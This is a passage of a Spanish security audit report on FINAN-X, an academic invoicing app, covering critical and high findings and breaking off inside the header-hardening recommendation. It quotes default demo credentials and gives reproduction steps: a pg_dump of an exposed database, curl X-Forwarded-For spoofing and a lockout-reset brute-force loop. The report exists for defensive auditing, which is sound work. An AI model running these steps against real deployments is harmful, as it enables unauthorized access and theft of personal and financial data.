# Auditoría de seguridad — FINAN-X

**Aplicación de facturación y pagos (proyecto académico con criterios de producción)**

| Dato | Valor |
|---|---|
| Informe | Auditoría de seguridad de código y configuración (revisión estática, solo lectura) |
| Proyecto auditado | FINAN-X · Facturación y pagos |
| Repositorio / rama | Working copy local · `main` |
| Commit revisado | `ce398d5` (2026-10-12) |
| Fecha del informe | 2 de noviembre de 2026 |
| Clasificación | **Confidencial** — contiene detalles de explotación |
| Alcance | Backend, frontend, base de datos, despliegue Docker y documentación de configuración |
| Metodología | OWASP Top 10 (2021), OWASP ASVS 4.0.3, CWE, CVSS v3.1 |
| Cambios realizados en el código | **Ninguno.** Auditoría de solo lectura (ver §2.5) |
| Resultado global | **Riesgo CRÍTICO** — no apto para producción en su estado actual |

---

## 0. Ficha del informe

**Objetivo.** Determinar, con mentalidad de atacante, qué podría hacer una persona maliciosa contra FINAN-X para leer, alterar o destruir información de facturación y datos personales de clientes, y entregar un plan de corrección priorizado y verificable.

**Naturaleza del sistema.** FINAN-X gestiona clientes (con identificación, teléfono, correo y dirección), productos, pedidos, facturas, pagos y notas de crédito. El portal del cliente permite consultar facturas, saldo, historial y registrar pagos. El panel interno permite administrar usuarios, clientes, pedidos, facturación, cartera y auditoría. Es, por tanto, un sistema que trata **datos personales y financieros** y cuya integridad tiene efecto económico directo: una factura o una nota de crédito manipulada es dinero.

**Por qué se audita como si fuera a producción.** Aunque el proyecto es universitario, el código ya incorpora controles propios de un sistema real (JWT con invalidación por versión, bloqueo por intentos fallidos, OTP con hash, bloqueos `FOR UPDATE` en pagos, transacciones con auditoría). Eso hace que la revisión sea útil de verdad: los hallazgos no son teóricos de manual, son los que separan este prototipo de un sistema que podría operar con datos de clientes reales.

---

## 1. Resumen ejecutivo

FINAN-X está **bien construido en el núcleo de la lógica de negocio** —las consultas están parametrizadas, los precios se calculan en el servidor, el saldo se deriva de una vista y los pagos usan bloqueo pesimista—, pero **el despliegue y la configuración de seguridad no están a la altura del código**. El riesgo no está en un fallo exótico: está en que, tal como está empaquetada la aplicación, **cualquier persona que pueda alcanzar los puertos publicados puede convertirse en administrador o descargar toda la base de datos**, sin explotar una sola línea de código de negocio.

En concreto, la combinación de tres hallazgos es suficiente para comprometer el sistema por completo:

1. **C-01** — El contenedor del backend ejecuta el *seed* en cada arranque y crea un administrador con contraseña conocida (`admin@finanx.test` / `admin123`), credenciales que además se muestran en la pantalla de login.
2. **C-02** — PostgreSQL se publica en `0.0.0.0:5432` con usuario y contraseña por defecto (`finanx`/`finanx`), y ese usuario es **superusuario** del motor.
3. **C-03** — No hay TLS en ningún punto: frontend en HTTP, API en HTTP y backend publicado directamente en el puerto 4000, saltándose el proxy.

Un atacante con acceso de red a la máquina donde se despliegue esta aplicación no necesita credenciales, ni una víctima que haga clic en nada, ni una vulnerabilidad de día cero: **entra como administrador, o se conecta a la base de datos y la vacía**. A partir de ahí, el resto del informe (datos personales, facturación, auditoría, integridad de pagos) es consecuencia.

El segundo bloque de riesgo es **operativo e interno**: el bloqueo de fuerza bruta se puede reiniciar a voluntad, cualquier rol operativo puede emitir devoluciones sin aprobación, y los datos de pago se devuelven completos por la API. En un sistema de facturación esto último importa tanto como un RCE: el fraude interno no necesita romper la aplicación, solo usarla.

### 1.1 Distribución de hallazgos

| Severidad | Cantidad | Descripción breve |
|---|---|---|
| **Crítica** | 3 | Compromiso total sin autenticación (credenciales por defecto, base de datos expuesta, ausencia de cifrado) |
| **Alta** | 6 | Bypass de autenticación/limitadores, robo de sesión, fraude interno, condición de carrera en devoluciones, política de contraseñas |
| **Media** | 14 | Exposición de datos, configuración, auditoría, validación, dependencias, respaldos |
| **Baja** | 9 | Endurecimiento, higiene de dependencias/imágenes, detalles de diseño |
| **Total** | **32** | |

### 1.2 Top 5 acciones inmediatas (antes de exponer la aplicación)

1. **Quitar el seed del arranque de producción** y eliminar/rotar las cuentas demo (§C-01).
2. **Cerrar el puerto 5432** y dejar de usar `finanx`/`finanx` como credenciales; la aplicación debe conectarse con un rol de privilegios mínimos (§C-02).
3. **Publicar solo el frontend con TLS** (443), dejar de publicar el 4000 y redirigir 80→443 con HSTS (§C-03).
4. **Corregir el bloqueo de login** (no reiniciar el contador con un login exitoso; contar por cuenta y por IP) y **desactivar el autoregistro público** o exigir verificación (§A-01, §A-02).
5. **Quitar las credenciales demo de la interfaz** y mover el token a cookie `HttpOnly`/`Secure` o, como mínimo, añadir CSP y acortar la vida del token (§A-03).

### 1.3 Escenario de ataque realista (kill chain)

> **De cero a administrador en tres pasos.**
> 1. El atacante descubre `http://<host>:8080`. La pantalla de login le muestra las credenciales demo.
> 2. Inicia sesión como `admin@finanx.test` / `admin123` → token JWT de ADMIN válido 8 horas.
> 3. Con ese token puede crear usuarios, leer todos los clientes, facturas, pagos y la auditoría, y modificar cualquier dato. No hace falta nada más.
>
> **Variante sin tocar la aplicación:** se conecta directamente a `postgres://finanx:finanx@<host>:5432/finanx` y ejecuta `pg_dump`. Obtiene la base completa: clientes, identificaciones, teléfonos, correos, direcciones, facturas, pagos y hashes de contraseña.

Ambos escenarios son **verificables en menos de un minuto** y no requieren herramientas especiales. Es exactamente el tipo de riesgo que un despliegue real no puede permitirse.

---

## 2. Alcance, metodología y limitaciones

### 2.1 Alcance

| Componente | Revisado | Observaciones |
|---|---|---|
| Backend Node.js/Express (`backend/src`) | Sí | 52 rutas, 4 middleware, configuración, arranque |
| Frontend React (`frontend/src`) | Sí | Cliente HTTP, autenticación, 25 páginas, plantillas |
| Esquema PostgreSQL (`database/*.sql`) | Sí | Tablas, restricciones, vista de saldo, índices |
| Empaquetado y despliegue | Sí | `Dockerfile` (backend/frontend), `docker-compose.yml`, `nginx.conf`, scripts de arranque |
| Dependencias | Sí | `npm audit` sobre lockfiles, versiones y avisos publicados |
| Documentación y variables de ejemplo | Sí | `README.md`, `.env.example`, guías de despliegue |
| Infraestructura real, red, DNS, WAF, proveedor cloud | No | Fuera del repositorio; se asume un despliegue típico (VPS o PaaS) |
| Pruebas dinámicas contra la app ejecutándose | No | El alcance acordado fue solo revisión estática (§2.4) |

### 2.2 Método de trabajo (cinco fases)

1. **Reconocimiento.** Inventario de archivos, stack, dependencias, endpoints, variables de entorno, scripts de arranque y configuración de despliegue. Sin ejecutar la aplicación.
2. **Revisión dirigida al dominio.** Para una aplicación de facturación se priorizó: autenticación y sesión, autorización por rol y por pertenencia (IDOR), lógica de negocio (precios, totales, saldos, numeración, devoluciones), integridad y concurrencia, datos personales y de pago.
3. **Revisión de clases de defecto.** Inyección SQL/NoSQL/comandos, XSS, CSRF, SSRF, *mass assignment*, *open redirect*, *path traversal*, *deserialización*, cabeceras y CORS, manejo de errores, *rate limiting*.
4. **Revisión de configuración y cadena de suministro.** Secretos, credenciales por defecto, puertos publicados, TLS, usuarios de base de datos, imágenes, dependencias con CVE.
5. **Contraste y descarte de falsos positivos.** Cada hipótesis se intentó refutar leyendo el flujo completo (por ejemplo: "¿hay SQLi?" se respondió revisando *todas* las interpolaciones de SQL; "¿hay IDOR en el portal?" se respondió comprobando que cada consulta filtra por `cliente_id` de la sesión).

### 2.3 Herramientas y evidencia

- Lectura de código y búsquedas con expresiones regulares sobre el árbol del proyecto.
- `git ls-files` y `git log` para verificar que `.env` **no** está versionado (solo `.env.example`).
- `npm audit` sobre los lockfiles de backend y frontend, con extracción de GHSA, CVSS y versión afectada.
- Revisión de `docker-compose.yml`, `Dockerfile`, `nginx.conf` y scripts `levantar.ps1` / `iniciar-app.ps1`.
- Inspección del esquema SQL (restricciones `CHECK`, índices únicos parciales, vista `factura_saldo`).
- **No** se ejecutaron exploits, ni escaneos de red, ni pruebas de carga, ni modificaciones en archivos del proyecto.

### 2.4 Limitaciones (declaración de honestidad)

- **Sin pruebas dinámicas.** No se levantó la aplicación ni se enviaron peticiones a un servidor en ejecución. Los hallazgos se basan en el código y la configuración; los que dependen de comportamiento en tiempo de ejecución (condiciones de carrera, *timing*) se describen como **PoC lógica**, no como explotación confirmada. Se recomienda validarlos en un entorno de pruebas propio (§8).
- **Sin revisión de infraestructura.** No se evaluaron firewall del proveedor, seguridad física, DNS, certificados, ni el hardening del sistema operativo anfitrión.
- **Sin pentest de red.** No se escanearon puertos ni servicios más allá de lo que declara `docker-compose.yml`.
- **Sin análisis de binarios ni del runtime de Node.** Se asume que el entorno de ejecución está actualizado.
- **Supuestos de despliegue.** Se asume un despliegue típico del repositorio (`docker compose up`), que es lo que documenta el propio proyecto. Si el despliegue real difiere (por ejemplo, sin publicar puertos), algunas severidades bajan; se indica en cada hallazgo cuando depende de ello.

### 2.5 Declaración de no modificación

Durante toda la auditoría **no se modificó ni un solo archivo del proyecto**. Se ejecutaron únicamente comandos de lectura (`Get-ChildItem`, `git ls-files`, `git log`, `npm audit`) y búsquedas de contenido. El árbol de trabajo estaba limpio salvo una carpeta de documentación preexistente y ajena a esta revisión (`documentacion/_trabajos/`, sin seguimiento en Git). Los únicos archivos creados son los de esta entrega, dentro de la carpeta `pruebas de seguridad/`.

---

## 3. Contexto: arquitectura y superficie de ataque

### 3.1 Arquitectura observada

```
Navegador
   │  HTTP :8080 (sin TLS)
   ▼
nginx (SPA React + proxy /api)  ──HTTP──►  Express :4000  ──TCP──►  PostgreSQL :5432
   │                                          │                      (publicado al host)
   │                                          └─ JWT + bcrypt + OTP
   ▼
localStorage: fx_token / fx_user
```

| Capa | Tecnología | Observación de seguridad |
|---|---|---|
| Frontend | React 18 + Vite + axios, servido por nginx 1.27 | SPA sin cabeceras de seguridad; token en `localStorage` |
| Backend | Node 22 + Express 4 + `pg` + `jsonwebtoken` + `bcryptjs` + `helmet` | Buen manejo de roles, transacciones y auditoría |
| Base de datos | PostgreSQL 16 | Esquema con `CHECK`, índices únicos parciales y vista de saldo; se conecta como superusuario |
| Mensajería OTP | Consola (demo) | En producción debe sustituirse por proveedor real |
| Despliegue | Docker Compose (3 servicios) | Puertos publicados de más y credenciales por defecto |

### 3.2 Actores y roles

| Actor | Acceso | Puede |
|---|---|---|
| Anónimo | Público | Login, autoregistro de cliente, recuperación de contraseña, salud del servicio |
| Cliente (portal) | Autenticado, ámbito `cliente_id` | Ver sus datos, pedidos, facturas, pagos, notas, saldo e historial; registrar pagos de sus facturas |
| CAJERO | Interno | Ver clientes/productos/pedidos/facturas/pagos; **registrar pagos**; crear y anular notas de crédito; anular facturas (ver A-04) |
| FACTURADOR | Interno | Gestión de clientes, pedidos y facturación |
| SUPERVISOR | Interno | Consulta financiera, reportes y auditoría |
| ADMIN | Interno | Todo, incluida la gestión de usuarios |

### 3.3 Inventario de endpoints

- **52 rutas** HTTP en total.
- **4 públicas**: `POST /api/auth/login`, `POST /api/auth/registro`, `POST /api/auth/recuperar-solicitar`, `POST /api/auth/recuperar-cambiar` (+ `GET /api/health`).
- **11 del portal** (`/api/mis-*`, `/api/mi-*`): exigen token de cliente y filtran por `cliente_id` de la sesión.
- **37 internas**: exigen token interno y, en general, rol.

La superficie pública es pequeña, lo cual es positivo. El problema no es su tamaño, sino lo que hay detrás (credenciales demo, base expuesta).

### 3.4 Datos sensibles tratados

| Categoría | Ejemplos | Marco |
|---|---|---|
| Identificación | Tipo y número de documento, NIT | Dato personal (Ley 1581 de 2012, Colombia) |
| Contacto | Teléfono, correo, dirección, ciudad | Dato personal |
| Financiero | Facturas, saldos, pagos, notas de crédito, historial | Dato financiero; impacto económico directo |
| Medios de pago | Banco, titular, últimos 4 dígitos, vencimiento, número de cuenta | PCI-DSS (parcial); datos sensibles |
| Credenciales | `password_hash` (bcrypt), códigos OTP (bcrypt) | Secreto de autenticación |
| Auditoría | Quién hizo qué y cuándo | Evidencia legal/forense |

**Lo correcto:** el sistema **no almacena** el número completo de tarjeta ni el CVV, y valida Luhn antes de aceptar una tarjeta. Eso reduce enormemente el alcance PCI. **Lo incorrecto:** guarda y devuelve el **número de cuenta completo** de transferencias y el vencimiento de la tarjeta sin enmascarar (M-05).

### 3.5 Modelo de amenazas (resumen)

| Amenaza | Probabilidad | Impacto | Hallazgos relacionados |
|---|---|---|---|
| Atacante externo sin credenciales | Alta | Crítico | C-01, C-02, A-01, A-02 |
| Intercepción de tráfico (red local/Wi-Fi/proxy) | Media | Alto | C-03, A-03 |
| Cliente autenticado curioso (IDOR) | Media | Alto | Mitigado; ver §5.5 |
| Empleado deshonesto (fraude) | Media | Alto | A-04, A-05, M-03 |
| Fuerza bruta / *credential stuffing* | Alta | Alto | A-01, A-02, A-06, M-04 |
| Fuga por *backup* o *dump* | Media | Crítico | C-02, M-08, M-14 |
| Error de configuración en producción | Alta | Alto | M-01 (OTP demo), C-01, C-03 |
| Cadena de suministro | Media | Medio | M-12, B-06 |

---

## 4. Controles que ya funcionan bien

Un informe honesto debe reconocer lo que está bien hecho. Estos controles **reducen** el impacto de varios ataques y deben conservarse:

- **Consultas parametrizadas en todo el backend.** Se revisaron las 117 interpolaciones de plantilla; todas construyen fragmentos estáticos (`WHERE`, `$n`, `LIMIT $n`) a partir de listas blancas, nunca concatenan datos del usuario. **No hay SQL injection** (ver §5.5).
- **Precios y totales calculados en el servidor** (`pedidos.js:93-105`): el cliente no puede enviar precios; se leen de `productos`. La manipulación de importes por request no es posible.
- **Saldo derivado de una vista** (`factura_saldo`) que suma pagos y notas de crédito en subconsultas independientes, evitando el producto cartesiano que inflaría/deflactaría saldos.
- **Bloqueo pesimista en pagos** (`FOR UPDATE OF f` en `pagos.js:65-73` y `mis.js:262-270`): impide sobrepagos por concurrencia.
- **Invalidación real de sesiones** con `token_version` (`auth.js:39-60`): cambiar la contraseña invalida tokens anteriores, algo que muchos proyectos no hacen.
- **Contraseñas con bcrypt** (coste 10) y **OTP guardado con hash bcrypt**, nunca en claro en la base.
- **Código OTP con `crypto.randomInt`**, no `Math.random`.
- **Bloqueo de login por IP** con contador de fallos y respuesta 429 (limitado; ver A-01).
- **Cabeceras de seguridad en la API** con `helmet()` y **CORS con lista blanca**.
- **Validación del secreto JWT al arrancar**: rechaza secretos de ejemplo, cortos o publicados (`config.js:10-67`). Excelente práctica.
- **Auditoría dentro de la misma transacción** que la operación (`audit.js`), de modo que no hay pagos sin traza.
- **Índice único parcial** `uq_factura_activa_por_pedido` que impone en la base la regla "una sola factura activa por pedido", incluso ante concurrencia.
- **Sin secretos versionados**: `.env` está en `.gitignore` y el historial solo contiene `.env.example`. El JWT_SECRET local es aleatorio y de 64 caracteres.

---

## 5. Hallazgos

> **Convenciones.** `CVSS` es una **estimación** (v3.1) basada en el impacto y la explotabilidad observados; no se ejecutó un cálculo formal con un escáner. `CWE` identifica la debilidad; `OWASP` la categoría del Top 10 2021.

### 5.1 Hallazgos críticos

#### C-01 · Credenciales de administrador por defecto creadas en cada arranque y publicadas en la interfaz

| Campo | Valor |
|---|---|
| Severidad | **Crítica** |
| CVSS estimado | **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-798 (credenciales embebidas), CWE-1392 (credenciales por defecto) |
| OWASP | A05:2021 *Security Misconfiguration* / A07:2021 *Identification and Authentication Failures* |
| Ubicación | `backend/Dockerfile:14`, `backend/src/seed.js:37-52,116-121`, `frontend/src/pages/Login.jsx:143-147`, `levantar.ps1:89-94` |

**Descripción.**
La imagen del backend se inicia con:

```dockerfile
CMD ["sh", "-c", "node src/seed.js && node src/index.js"]
```

El *seed* crea, si no existen, cuatro usuarios internos con contraseñas triviales y **las imprime en el log**:

```js
{ nombre: 'Administrador', correo: 'admin@finanx.test', rol: 'ADMIN', password: 'admin123' },
{ nombre: 'Facturador',   correo: 'facturador@finanx.test', rol: 'FACTURADOR', password: 'facturador123' },
{ nombre: 'Cajero',       correo: 'cajero@finanx.test', rol: 'CAJERO', password: 'cajero123' },
{ nombre: 'Supervisor',   correo: 'supervisor@finanx.test', rol: 'SUPERVISOR', password: 'supervisor123' },
```

Además, la pantalla de login muestra esas credenciales al visitante:

```jsx
<div className="login-hint">
  <strong>Credenciales demo:</strong><br />
  Interno: <code>admin@finanx.test</code> / <code>admin123</code><br />
  Cliente: <code>cliente@finanx.test</code> / <code>cliente123</code>
</div>
```

**Por qué es crítico.** El *seed* se ejecuta en **cada arranque del contenedor**, también con `NODE_ENV=production`. En una instalación nueva (la base de datos está vacía), la primera cosa que ocurre es que se crea un ADMIN con una contraseña que está escrita en el repositorio, en el log y en la propia pantalla de login. No hay ninguna barrera: ni correo verificado, ni cambio obligatorio de contraseña, ni restricción de primer inicio.

**Impacto.** Compromiso total e inmediato: creación de usuarios ADMIN, lectura y modificación de todos los datos, anulación de facturas, emisión de notas de crédito, borrado/alteración de registros, y acceso a la auditoría. Un atacante puede además crear un usuario "legítimo" y borrar la evidencia si la auditoría no es inmutable (M-07).

**Reproducción lógica (no ejecutada).**
1. Desplegar con `docker compose up -d`.
2. Abrir `http://<host>:8080/login`; la propia página muestra las credenciales.
3. `POST /api/auth/login` con `{"username":"admin@finanx.test","password":"admin123"}`.
4. La respuesta incluye `token` y `user.rol = "ADMIN"`. Usar `Authorization: Bearer <token>` contra cualquier endpoint interno.

**Recomendación (prioridad máxima).**

1. **Sacar el seed del arranque de producción.** En el `Dockerfile`:

```dockerfile
CMD ["node", "src/index.js"]
```

   y ejecutar el seed solo en desarrollo (`npm run seed`) o detrás de una bandera explícita que **no** pueda activarse en producción:

```js
if (process.env.SEED_DEMO === 'true' && process.env.NODE_ENV !== 'production') { /* seed */ }
```

2. **No crear usuarios con contraseña fija.** Si se necesita un primer administrador, generarlo con contraseña aleatoria de un solo uso, mostrarla **una vez por consola del operador** y **obligar el cambio en el primer inicio** (`debe_cambiar_password = true`).
3. **Eliminar el bloque de credenciales demo de `Login.jsx`.** En producción no debe existir ningún texto que revele usuarios o contraseñas.
4. **Rotar** cualquier contraseña demo que ya se haya usado en un entorno expuesto y **revisar la auditoría** en busca de logins con `admin@finanx.test`.
5. Añadir una comprobación de arranque que **falle** si existen usuarios con la contraseña demo conocida (comparar hash contra `admin123` y abortar).

---

#### C-02 · PostgreSQL publicado en `0.0.0.0:5432` con credenciales por defecto y superusuario

| Campo | Valor |
|---|---|
| Severidad | **Crítica** |
| CVSS estimado | **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-1188 (recurso inseguro por defecto), CWE-1392, CWE-250 (privilegios innecesarios) |
| OWASP | A05:2021 *Security Misconfiguration* / A01:2021 *Broken Access Control* |
| Ubicación | `docker-compose.yml:2-18` (puerto `5432:5432`), `docker-compose.yml:5-8` (`finanx`/`finanx`), `backend/src/config.js:73-79` |

**Descripción.**

```yaml
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: finanx
      POSTGRES_PASSWORD: finanx
      POSTGRES_DB: finanx
    ports:
      - "5432:5432"      # ← publicado en todas las interfaces del host
```

`POSTGRES_USER` en la imagen oficial de PostgreSQL crea un **superusuario**. El backend se conecta con ese mismo usuario (`PGUSER=finanx`), de modo que la aplicación también corre como superusuario.

**Por qué es crítico.** `ports: "5432:5432"` publica el puerto en **todas** las interfaces del anfitrión (no solo en `127.0.0.1`). Cualquiera que alcance esa IP —la red del campus, una Wi-Fi compartida, Internet si el servidor tiene IP pública y el firewall lo permite— puede conectarse con `finanx`/`finanx`. No hace falta la aplicación: basta `psql`, DBeaver o `pg_dump`.

**Impacto.**
- **Confidencialidad:** volcado completo de clientes (identificación, teléfono, correo, dirección), facturas, pagos, notas y hashes bcrypt de contraseñas (crackeables si son débiles, ver A-06).
- **Integridad:** `UPDATE`/`DELETE` arbitrarios; cambiar el total de una factura, marcar como pagada una deuda, crear notas de crédito.
- **Disponibilidad:** `DROP TABLE`, `TRUNCATE`, bloqueos.
- **Escalada:** como superusuario de PostgreSQL, `COPY ... FROM PROGRAM` permite **ejecutar comandos en el sistema operativo** del contenedor de base de datos (y desde ahí, pivotar a la red interna).

**Reproducción lógica.**
```
psql "host=<host> port=5432 user=finanx password=finanx dbname=finanx" -c "\dt"
pg_dump "postgresql://finanx:finanx@<host>:5432/finanx" > finanx.sql
```

**Recomendación.**

1. **Quitar el bloque `ports` del servicio `db`.** Los contenedores de la misma red de Compose se ven por nombre (`db:5432`) sin publicar nada. Si se necesita acceso desde el anfitrión para administrar, publicar **solo en loopback**: `"127.0.0.1:5432:5432"`.
2. **Credenciales fuertes y secretas**, fuera del repositorio:

```yaml
    environment:
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Defina POSTGRES_PASSWORD en .env}
```

   y generar una aleatoria (`openssl rand -base64 32`).
3. **Usuario de aplicación con privilegios mínimos** (sin superusuario, sin DDL):

```sql
CREATE ROLE finanx_app LOGIN PASSWORD '...';
GRANT CONNECT ON DATABASE finanx TO finanx_app;
GRANT USAGE ON SCHEMA public TO finanx_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO finanx_app;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO finanx_app;
REVOKE ALL ON SCHEMA public FROM PUBLIC;
```

   Las migraciones se ejecutan con otro rol (`finanx_migrator`), no con el de la aplicación.
4. **`pg_hba.conf` restrictivo** (solo `scram-sha-256`, solo la red de Docker) y **TLS en la conexión** si la base está en otro host.
5. **Firewall del anfitrión**: denegar 5432 desde fuera, incluso en loopback si no se usa.

---

#### C-03 · Ausencia total de cifrado en tránsito y backend expuesto directamente

| Campo | Valor |
|---|---|
| Severidad | **Crítica** (Alta si el despliegue se limita a una red confiable) |
| CVSS estimado | **7.4** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| CWE | CWE-319 (transmisión en claro), CWE-311 (falta de cifrado de datos sensibles) |
| OWASP | A02:2021 *Cryptographic Failures* |
| Ubicación | `frontend/nginx.conf:1-14`, `docker-compose.yml:53-54,68-69`, `backend/src/index.js:21` |

**Descripción.**
- nginx escucha **solo en el puerto 80** (`listen 80;`), sin TLS, sin redirección a HTTPS y sin HSTS.
- El backend publica `4000:4000`, accesible **sin pasar por nginx**.
- La API y el frontend hablan HTTP en claro; el JWT viaja en la cabecera `Authorization` y los datos personales en el cuerpo.

**Impacto.**
- **Robo de sesión** por cualquiera que pueda observar el tráfico (Wi-Fi pública, proxy corporativo, ARP spoofing, operador de red, *logs* de un balanceador mal configurado): el token Bearer es suficiente para suplantar al usuario durante 8 horas.
- **Lectura y modificación** de datos personales y financieros en tránsito (MITM): cambiar el `valor` de un pago, la respuesta de una factura, etc.
- **Saltarse nginx:** al estar el 4000 publicado, el atacante accede a la API sin las protecciones que se añadan al proxy, y puede falsificar `X-Forwarded-For` (ver A-02).
- Incumplimiento de PCI-DSS (requisito 4: cifrado en tránsito) y de la Ley 1581 (medidas de seguridad).

**Recomendación.**

1. **Terminar TLS en nginx** (o en un proxy delante: Caddy, Traefik, ALB) con certificado de una CA reconocida (Let's Encrypt). Redirigir 80→443 y añadir HSTS:

```nginx
server { listen 80; server_name finanx.example.com; return 301 https://$host$request_uri; }

server {
  listen 443 ssl http2;
  server_name finanx.example.com;
  ssl_certificate     /etc/letsencrypt/live/finanx/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/finanx/privkey.pem;
  ssl_protocols TLSv1.2 TLSv1.3;
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
  # ...
}
```

2. **Dejar de publicar el 4000.** El backend solo debe ser alcanzable desde la red de Compose (`expose: 4000` en lugar de `ports`).
3. Fijar `CORS_ORIGINS` al dominio real y forzar HTTPS en las redirecciones del frontend.

---

### 5.2 Hallazgos altos

#### A-01 · El bloqueo de fuerza bruta se reinicia con cualquier login exitoso (y el autoregistro es público)

| Campo | Valor |
|---|---|
| Severidad | **Alta** |
| CVSS estimado | **7.5** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| CWE | CWE-307 (restricción inadecuada de intentos), CWE-799 |
| OWASP | A07:2021 *Identification and Authentication Failures* |
| Ubicación | `backend/src/middleware/rateLimit.js:32-53`, `backend/src/routes/auth.js:61,89,105` |

**Descripción.**
El limitador cuenta fallos por IP y **borra el contador cuando hay un login correcto**:

```js
// auth.js:61 (usuario interno) y :89 (cliente)
limpiarFallosLogin(req); // un acierto resetea el contador de fallos de la IP
```

```js
export function limpiarFallosLogin(req) {
  fallosPorIp.delete(ipDe(req));
}
```

El autoregistro (`POST /api/auth/registro`) es público y crea una cuenta de cliente válida al instante, sin verificación de correo ni teléfono. Por tanto, **cualquiera puede fabricarse una cuenta legítima** y usarla para resetear el contador cuando le convenga.

**Por qué es alta.** El control existe, pero se puede neutralizar sin explotar nada: es un control **eludible por diseño**. El atacante alterna 4 intentos fallidos contra `admin@finanx.test` con 1 login correcto en su propia cuenta, y nunca llega a 5 fallos. El bloqueo de 15 minutos jamás se activa.

**Reproducción lógica (no ejecutada).**
1. `POST /api/auth/registro` → cuenta propia válida.
2. Bucle:
   - 4 × `POST /api/auth/login` con `admin@finanx.test` y contraseñas del diccionario → 401.
   - 1 × `POST /api/auth/login` con la cuenta propia → 200 y **contador a cero**.
3. Repetir hasta acertar. El límite por IP nunca se supera.

**Impacto.** Fuerza bruta / *password spraying* sin límite práctico contra cualquier cuenta, en particular ADMIN. Con contraseñas como `admin123` o de 6 caracteres (A-06), el éxito es cuestión de tiempo.

**Recomendación.**
1. **No reiniciar el contador global** por un login correcto. Si se quiere no penalizar al usuario legítimo, llevar contadores separados: por `(IP, usuario)` y por usuario.
2. **Bloqueo por cuenta** con retroceso exponencial (5 fallos → 1 min, 10 → 15 min, 20 → 1 h) y notificación al titular.
3. **Eliminar o restringir el autoregistro público** (invitación, verificación de correo, aprobación interna). Mientras sea público, cualquier limitador basado en "tener una cuenta válida" es eludible.
4. Añadir **CAPTCHA** tras 3 fallos y **alertas** de muchos 401 por cuenta.
5. Mantener el contador en **Redis** si hay más de una instancia (hoy es un `Map` en memoria; ver B-08).

---

#### A-02 · Suplantación de IP con `X-Forwarded-For` al acceder directamente al backend

| Campo | Valor |
|---|---|
| Severidad | **Alta** |
| CVSS estimado | **7.5** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| CWE | CWE-348 (uso de fuente menos confiable), CWE-290 (suplantación por cabecera) |
| OWASP | A05:2021 / A07:2021 |
| Ubicación | `backend/src/index.js:21`, `docker-compose.yml:53-54`, `backend/src/middleware/rateLimit.js:16-18` |

**Descripción.**

```js
// req.ip real detrás de nginx (que reenvía X-Forwarded-For) — una sola capa de proxy.
app.set('trust proxy', 1);
```

Con `trust proxy = 1`, Express confía en el último salto y toma la IP de `X-Forwarded-For`. Eso es correcto **si y solo si** todas las peticiones llegan por nginx. Pero el backend está publicado en `4000:4000`, así que un atacante puede conectarse **directamente** a `http://<host>:4000` y enviar `X-Forwarded-For: <IP arbitraria>`. Express la acepta como IP del cliente.

**Impacto.**
- **Bypass de todos los limitadores por IP**: login (A-01), registro, recuperación de contraseña (OTP).
- **Envenenamiento de la auditoría** si en el futuro se registra la IP (hoy no se registra, M-07): quedaría una IP falsa.
- Permite repartir intentos entre "IPs" distintas sin cambiar de origen real.

**Reproducción lógica.**
```
curl -H 'X-Forwarded-For: 203.0.113.7'  http://<host>:4000/api/auth/login ...
curl -H 'X-Forwarded-For: 203.0.113.8'  http://<host>:4000/api/auth/login ...
# cada petición parece venir de una IP distinta → el contador nunca sube
```

**Recomendación.**
1. **No publicar el 4000** (lo mismo que C-03).
2. Configurar la confianza de forma explícita, no numérica:

```js
app.set('trust proxy', ['loopback', '172.16.0.0/12']); // solo la red interna de Docker
```

3. En nginx, **sobrescribir** la cabecera en lugar de añadirla: `proxy_set_header X-Forwarded-For $remote_addr;` (con `$proxy_add_x_forwarded_for` se concatena lo que envíe el cliente).
4. Validar en el backend que, si se usa `XFF`, el socket sea de un proxy conocido; si no, ignorar la cabecera.

---

#### A-03 · Token JWT en `localStorage` y SPA sin CSP ni cabeceras de seguridad

| Campo | Valor |
|---|---|
| Severidad | **Alta** |
| CVSS estimado | **6.5** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| CWE | CWE-922 (almacenamiento inseguro de información sensible), CWE-1021 (clickjacking) |
| OWASP | A01:2021 / A05:2021 / A07:2021 |
| Ubicación | `frontend/src/auth.jsx:17-18`, `frontend/src/api.js:6`, `frontend/nginx.conf:1-14` |

**Descripción.**
El token se guarda en `localStorage`:

```js
localStorage.setItem('fx_token', token);
localStorage.setItem('fx_user', JSON.stringify(u));
```

`localStorage` es accesible desde cualquier JavaScript del mismo origen. Cualquier XSS —hoy no se encontró uno explotable, pero el riesgo existe en cualquier aplicación que crezca— se convierte en **robo de sesión completo**, y el token dura 8 horas. Además:

- El token no se puede revocar desde el servidor salvo cambiando la contraseña (`token_version`).
- El frontend **no tiene CSP** ni `X-Frame-Options`: el panel de administración puede embeberse en un iframe de un sitio malicioso (clickjacking) y ejecutar acciones con la sesión de la víctima.
- No hay `Referrer-Policy`, `Permissions-Policy` ni `Cache-Control: no-store` en las respuestas con datos.

**Impacto.** Robo de sesión (incluido ADMIN) vía XSS o extensión maliciosa; clickjacking para forzar acciones (crear usuario, anular factura) con la sesión de un operador; persistencia del token en el disco del equipo.

**Recomendación.**
1. **Mover la sesión a cookies** `HttpOnly; Secure; SameSite=Strict` (o `Lax`), con `Path=/`, y añadir protección CSRF (token de doble envío o `Origin` check). Con `HttpOnly`, un XSS no puede leer el token.
2. Si se mantiene Bearer en `localStorage`, **acortar la vida** (15-30 min) y añadir *refresh token* rotativo en cookie `HttpOnly`.
3. **Cabeceras en nginx** (no solo en la API):

```nginx
